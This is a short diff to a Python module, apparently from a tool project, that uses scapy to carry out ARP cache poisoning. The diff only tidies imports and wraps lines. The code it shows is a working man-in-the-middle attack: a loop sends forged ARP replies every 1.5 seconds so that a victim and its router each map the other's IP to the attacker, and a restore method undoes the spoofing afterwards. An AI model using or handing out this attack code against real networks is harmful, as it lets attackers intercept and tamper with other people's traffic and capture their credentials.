@@ -1,7 +1,7 @@
 #! /usr/bin/env python3.6
 """Arp posoining object"""
 
-from scapy.all import *
+from scapy.all import arping, Ether, send, ARP
 from threading import Thread
 import sys
 import logging
@@ -37,13 +37,19 @@ class Arp:
     def restore(self):
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
             ipf.write('0\n')
-        send(ARP(op=2, pdst=self.router, psrc=self.victim, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victim_mac), count=3, verbose=False)
-        send(ARP(op=2, pdst=self.victim, psrc=self.router, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.router_mac), count=3, verbose=False)
+        send(ARP(op=2, pdst=self.router, psrc=self.victim,
+                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victim_mac),
+             count=3, verbose=False)
+        send(ARP(op=2, pdst=self.victim, psrc=self.router,
+                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.router_mac),
+             count=3, verbose=False)
 
     def poison(self):
         while self.run:
-            send(ARP(op=2, pdst=self.victim, psrc=self.router, hwdst=self.victim_mac), verbose=False)
-            send(ARP(op=2, pdst=self.router, psrc=self.victim, hwdst=self.router_mac), verbose=False)
+            send(ARP(op=2, pdst=self.victim, psrc=self.router,
+                 hwdst=self.victim_mac), verbose=False)
+            send(ARP(op=2, pdst=self.router, psrc=self.victim,
+                 hwdst=self.router_mac), verbose=False)
             time.sleep(1.5)
 
     def start(self):
